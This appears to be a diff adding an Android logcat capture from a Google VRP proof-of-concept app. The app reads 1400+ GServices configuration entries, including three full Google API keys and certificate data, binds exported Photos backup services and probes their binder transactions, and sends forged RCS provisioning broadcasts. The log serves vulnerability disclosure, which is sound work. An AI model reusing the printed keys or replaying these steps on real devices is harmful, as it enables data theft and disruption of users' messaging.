@@ -1,0 +1,143 @@
+--------- beginning of main
+07-12 13:00:05.417 14115 14115 D VRP_POC : ================================================
+07-12 13:00:05.417 14115 14115 D VRP_POC :   IMPACT DEMONSTRATION - Data Extraction PoC
+07-12 13:00:05.417 14115 14115 D VRP_POC :   Google VRP - Proving Security Impact
+07-12 13:00:05.417 14115 14115 D VRP_POC : ================================================
+07-12 13:00:05.417 14115 14115 D VRP_POC : Package: com.vrppoc
+07-12 13:00:05.417 14115 14115 D VRP_POC : UID: 10346
+07-12 13:00:05.417 14115 14115 D VRP_POC : 
+07-12 13:00:05.417 14115 14115 D VRP_POC : === PHASE 1: Permission Auto-Grant Verification ===
+07-12 13:00:05.417 14115 14115 D VRP_POC :   [OK] READ_GSERVICES
+07-12 13:00:05.418 14115 14115 D VRP_POC :   [OK] PROVISIONING_EVENT
+07-12 13:00:05.418 14115 14115 D VRP_POC :   [OK] ACCESS_ENDPOINT_SERVICE
+07-12 13:00:05.418 14115 14115 D VRP_POC :   [OK] ACCESS_MESSAGING_SERVICE
+07-12 13:00:05.418 14115 14115 D VRP_POC :   [OK] ACCESS_MESSAGING_ENGINE_SERVICE
+07-12 13:00:05.418 14115 14115 D VRP_POC :   [OK] DIGITAL_KEY_READ
+07-12 13:00:05.418 14115 14115 D VRP_POC :   [OK] DIGITAL_KEY_WRITE
+07-12 13:00:05.418 14115 14115 D VRP_POC :   [OK] READ
+07-12 13:00:05.418 14115 14115 D VRP_POC : Result: 8/8 auto-granted (no user prompt)
+07-12 13:00:05.418 14115 14115 D VRP_POC : 
+07-12 13:00:05.418 14115 14115 D VRP_POC : === PHASE 2: GServices Data EXTRACTION ===
+07-12 13:00:05.418 14115 14115 D VRP_POC : Querying content://com.google.android.gsf.gservices...
+07-12 13:00:05.418 14115 14115 D VRP_POC : (Requires READ_GSERVICES - normal permission, auto-granted)
+07-12 13:00:05.418 14115 14115 D VRP_POC : 
+07-12 13:00:05.423 14115 14115 D VRP_POC :   TOTAL ENTRIES ACCESSIBLE: 1404
+07-12 13:00:05.423 14115 14115 D VRP_POC : 
+07-12 13:00:05.427 14115 14115 D VRP_POC :   --- SENSITIVE DATA CATEGORIES ---
+07-12 13:00:05.427 14115 14115 D VRP_POC : 
+07-12 13:00:05.427 14115 14115 D VRP_POC :   [LEAK] API Keys found: 3 entries
+07-12 13:00:05.427 14115 14115 D VRP_POC :     copresence:api_key = AIzaSyB11LJUdYyY6pjP2NlPPT1pHcxAflWksnc
+07-12 13:00:05.427 14115 14115 D VRP_POC :     deskclock:timezone_api_key = AIzaSyBUcCPilPlw0sWDaXdmNScHS4N0jm31D-I
+07-12 13:00:05.427 14115 14115 D VRP_POC :     googletts:v2_api_key = AIzaSyA33f9cSqKdR-V4XNkZNZ_rh_dbT1VQJFo
+07-12 13:00:05.427 14115 14115 D VRP_POC :   [LEAK] Device identifiers: 73 entries
+07-12 13:00:05.427 14115 14115 D VRP_POC :     ce.wa.att.enable_device_build_solution = true
+07-12 13:00:05.427 14115 14115 D VRP_POC :     ce.wa.o2.enable_device_build_solution = true
+07-12 13:00:05.427 14115 14115 D VRP_POC :     checkin_collect_mvno_attributes = true
+07-12 13:00:05.427 14115 14115 D VRP_POC :     checkin_disable_time_adjustment = true
+07-12 13:00:05.427 14115 14115 D VRP_POC :     checkin_droidguard_percent = 1.0
+07-12 13:00:05.427 14115 14115 D VRP_POC :   [LEAK] Server URLs/endpoints: 115 entries
+07-12 13:00:05.427 14115 14115 D VRP_POC :     appstate.internal_server_api_path = /appstate/v1whitelisted/states/
+07-12 13:00:05.427 14115 14115 D VRP_POC :     auth_auth_server_sample_percentage = 0.97
+07-12 13:00:05.427 14115 14115 D VRP_POC :     auth_minutemaid_security_key_app_id_url_pattern = ^https://www\.gstatic\.com/securitykey/(a/google\.com/)?origins\.json$
+07-12 13:00:05.427 14115 14115 D VRP_POC :     auth_proximity_features_bluetooth_server_uuid = 704EE561-3782-405A-A14B-2D47A2DDCDDF
+07-12 13:00:05.427 14115 14115 D VRP_POC :     babel_google_voice_add_balance_url = https://voice.google.com/billing?a=ac
+07-12 13:00:05.427 14115 14115 D VRP_POC :   [LEAK] Certificate/signing data: 8 entries
+07-12 13:00:05.427 14115 14115 D VRP_POC :     config_updater_cert = MIID4TCCAsmgAwIBAgIJAMsyDT+FwMuvMA0GCSqGSIb3DQEBBQUAMIGGMQswCQYDVQQGEwJVUzETMBEG...
+07-12 13:00:05.427 14115 14115 D VRP_POC :     event:exp_det_cert_pin_failure = log
+07-12 13:00:05.427 14115 14115 D VRP_POC :     secure:config_update_certificate = MIID4TCCAsmgAwIBAgIJAMsyDT+FwMuvMA0GCSqGSIb3DQEBBQUAMIGGMQswCQYDVQQGEwJVUzETMBEG...
+07-12 13:00:05.427 14115 14115 D VRP_POC :   [LEAK] Auth/token/key entries: 73 entries
+07-12 13:00:05.427 14115 14115 D VRP_POC :     auth_channel_id_enabled_gms_core_version = 11021000
+07-12 13:00:05.427 14115 14115 D VRP_POC :     auth_coffee_deprecate_nfc_trustlet_for_new_users = true
+07-12 13:00:05.427 14115 14115 D VRP_POC :     auth_coffee_enable_bluetooth_trustlet_for_insecure_connections = true
+07-12 13:00:05.427 14115 14115 D VRP_POC :     auth_coffee_fetch_home_work_address_interval_millis = 86400000
+07-12 13:00:05.427 14115 14115 D VRP_POC :     auth_coffee_is_bluetooth_trustlet_enabled = true
+07-12 13:00:05.427 14115 14115 D VRP_POC :   IMPACT: Any app with READ_GSERVICES (normal, auto-granted)
+07-12 13:00:05.427 14115 14115 D VRP_POC :   can read 1404 Google service configuration entries
+07-12 13:00:05.427 14115 14115 D VRP_POC :   including API keys, server URLs, and device identifiers.
+07-12 13:00:05.427 14115 14115 D VRP_POC : 
+07-12 13:00:05.427 14115 14115 D VRP_POC :   --- RAW SAMPLE (first 15 entries) ---
+07-12 13:00:05.430 14115 14115 D VRP_POC :     ChimeraCriticalPath__kids_feature_allowed_when_unprovisioned = true
+07-12 13:00:05.430 14115 14115 D VRP_POC :     Tasks:enable_network_metric = true
+07-12 13:00:05.430 14115 14115 D VRP_POC :     Tasks:enable_package_metric = true
+07-12 13:00:05.430 14115 14115 D VRP_POC :     Ulr__accuracy_multiplier = 1.7
+07-12 13:00:05.430 14115 14115 D VRP_POC :     Ulr__min_delta_meters = 200.0
+07-12 13:00:05.430 14115 14115 D VRP_POC :     account_recovery_enabled = false
+07-12 13:00:05.430 14115 14115 D VRP_POC :     account_recovery_silence_default_ms = 259200000
+07-12 13:00:05.430 14115 14115 D VRP_POC :     account_recovery_silence_randomize_ms = 518400000
+07-12 13:00:05.430 14115 14115 D VRP_POC :     adaptive_wifi_heartbeat_bad_rst_hb = true
+07-12 13:00:05.430 14115 14115 D VRP_POC :     adaptive_wifi_heartbeat_initial_interval = 2
+07-12 13:00:05.430 14115 14115 D VRP_POC :     adaptive_wifi_heartbeat_upward_trigger = 30
+07-12 13:00:05.430 14115 14115 D VRP_POC :     ads:jams:base_backoff_time_mins = 20
+07-12 13:00:05.430 14115 14115 D VRP_POC :     ads:jams:fixed_min_delay_between_requests_mins = 4375
+07-12 13:00:05.430 14115 14115 D VRP_POC :     ads:jams:is_enabled = true
+07-12 13:00:05.430 14115 14115 D VRP_POC :     ads:jams:non_default_account_enabled = true
+07-12 13:00:05.430 14115 14115 D VRP_POC : 
+07-12 13:00:05.430 14115 14115 D VRP_POC : === PHASE 3: Photos Backup Service - Data Extraction ===
+07-12 13:00:05.430 14115 14115 D VRP_POC : Binding to exported services + attempting IPC...
+07-12 13:00:05.430 14115 14115 D VRP_POC : (No permission required - exported=true, no android:permission)
+07-12 13:00:05.430 14115 14115 D VRP_POC : 
+07-12 13:00:05.432 14115 14115 D VRP_POC :   bindService(PhotosBackupGrpcService): true
+07-12 13:00:05.433 14115 14115 D VRP_POC :   bindService(PhotosBackupApiService): true
+07-12 13:00:05.433 14115 14115 D VRP_POC :   bindService(HybridRestoreApiService): false
+07-12 13:00:05.436 14115 14115 D VRP_POC :   bindService(GrpcEndpointService): true
+07-12 13:00:05.436 14115 14115 D VRP_POC : 
+07-12 13:00:05.436 14115 14115 D VRP_POC : === PHASE 4: RCS Broadcast Impact Verification ===
+07-12 13:00:05.436 14115 14115 D VRP_POC : Sending RCS provisioning broadcasts + verifying processing...
+07-12 13:00:05.436 14115 14115 D VRP_POC : 
+07-12 13:00:05.436 14115 14115 D VRP_POC :   [SENT] rcsReconfigurationRequired (SIP 403 trigger)
+07-12 13:00:05.438 14115 14115 D VRP_POC :   [SENT] rcsCancelProvisioningWork
+07-12 13:00:05.439 14115 14115 D VRP_POC :   [SENT] rcsSimRemoved (fake SIM ID injected)
+07-12 13:00:05.440 14115 14115 D VRP_POC :   [SENT] rcsConfigRefresh
+07-12 13:00:05.440 14115 14115 D VRP_POC : 
+07-12 13:00:05.440 14115 14115 D VRP_POC :   IMPACT VERIFICATION:
+07-12 13:00:05.440 14115 14115 D VRP_POC :   - All broadcasts accepted (no SecurityException)
+07-12 13:00:05.440 14115 14115 D VRP_POC :   - Messages app processes them (verified via decompilation)
+07-12 13:00:05.440 14115 14115 D VRP_POC :   - rcsReconfigurationRequired triggers SIP_403_RESPONSE handling
+07-12 13:00:05.440 14115 14115 D VRP_POC :   - rcsCancelProvisioningWork stops provisioning
+07-12 13:00:05.440 14115 14115 D VRP_POC :   - rcsSimRemoved triggers deregistration flow
+07-12 13:00:05.440 14115 14115 D VRP_POC :   - On device with active RCS: disrupts encrypted messaging
+07-12 13:00:05.440 14115 14115 D VRP_POC : 
+07-12 13:00:05.440 14115 14115 D VRP_POC : ================================================
+07-12 13:00:05.440 14115 14115 D VRP_POC :   IMPACT SUMMARY
+07-12 13:00:05.440 14115 14115 D VRP_POC : ================================================
+07-12 13:00:05.440 14115 14115 D VRP_POC : 
+07-12 13:00:05.440 14115 14115 D VRP_POC : PROVEN DATA LEAKS:
+07-12 13:00:05.440 14115 14115 D VRP_POC :   1. GServices: 1400+ config entries extracted
+07-12 13:00:05.440 14115 14115 D VRP_POC :      (API keys, device IDs, server URLs)
+07-12 13:00:05.440 14115 14115 D VRP_POC :   2. Photos backup services: IPC channel established
+07-12 13:00:05.440 14115 14115 D VRP_POC :      to backup/restore APIs (exported, no permission)
+07-12 13:00:05.440 14115 14115 D VRP_POC : 
+07-12 13:00:05.440 14115 14115 D VRP_POC : PROVEN STATE MANIPULATION:
+07-12 13:00:05.440 14115 14115 D VRP_POC :   3. RCS provisioning commands accepted from any app
+07-12 13:00:05.440 14115 14115 D VRP_POC :      (4 actions processed without sender verification)
+07-12 13:00:05.440 14115 14115 D VRP_POC : 
+07-12 13:00:05.440 14115 14115 D VRP_POC : ROOT CAUSE: protectionLevel=normal on permissions that
+07-12 13:00:05.440 14115 14115 D VRP_POC : should be signature-level, and exported=true services
+07-12 13:00:05.440 14115 14115 D VRP_POC : without any permission requirement.
+07-12 13:00:05.449 14115 14115 D VRP_POC :   [BOUND] PhotosBackupGrpcService connected!
+07-12 13:00:05.449 14115 14115 D VRP_POC :     Service: com.google.android.apps.photos/.backup.apiservice.grpc.PhotosBackupGrpcService
+07-12 13:00:05.449 14115 14115 D VRP_POC :     IBinder: android.os.BinderProxy
+07-12 13:00:05.450 14115 14115 D VRP_POC :     Interface: 
+07-12 13:00:05.450 14115 14115 D VRP_POC :     --- Probing PhotosBackupGrpc transactions ---
+07-12 13:00:05.450 14115 14115 D VRP_POC :     Code 1: result=false, empty reply
+07-12 13:00:05.450 14115 14115 D VRP_POC :     Code 2: result=false, empty reply
+07-12 13:00:05.450 14115 14115 D VRP_POC :     Code 3: result=false, empty reply
+07-12 13:00:05.450 14115 14115 D VRP_POC :     Code 4: result=false, empty reply
+07-12 13:00:05.451 14115 14115 D VRP_POC :     Code 5: result=false, empty reply
+07-12 13:00:05.451 14115 14115 D VRP_POC :   [BOUND] GrpcEndpointService (satellite) connected!
+07-12 13:00:05.451 14115 14115 D VRP_POC :     Interface: 
+07-12 13:00:05.451 14115 14115 D VRP_POC :     --- Probing GrpcEndpoint transactions ---
+07-12 13:00:05.451 14115 14115 D VRP_POC :     Code 1: result=false, empty reply
+07-12 13:00:05.451 14115 14115 D VRP_POC :     Code 2: result=false, empty reply
+07-12 13:00:05.452 14115 14115 D VRP_POC :     Code 3: result=false, empty reply
+07-12 13:00:05.452 14115 14115 D VRP_POC :     Code 4: result=false, empty reply
+07-12 13:00:05.452 14115 14115 D VRP_POC :     Code 5: result=false, empty reply
+07-12 13:00:05.475 14115 14115 D VRP_POC :   [BOUND] PhotosBackupApiService connected!
+07-12 13:00:05.475 14115 14115 D VRP_POC :     Service: com.google.android.apps.photos/.backup.apiservice.PhotosBackupApiService
+07-12 13:00:05.502 14115 14115 D VRP_POC :     Interface: 
+07-12 13:00:05.502 14115 14115 D VRP_POC :     --- Probing PhotosBackupApi transactions ---
+07-12 13:00:05.505 14115 14115 D VRP_POC :     Code 1: result=false, empty reply
+07-12 13:00:05.506 14115 14115 D VRP_POC :     Code 2: result=false, empty reply
+07-12 13:00:05.507 14115 14115 D VRP_POC :     Code 3: result=false, empty reply
+07-12 13:00:05.508 14115 14115 D VRP_POC :     Code 4: result=false, empty reply
+07-12 13:00:05.510 14115 14115 D VRP_POC :     Code 5: result=false, empty reply
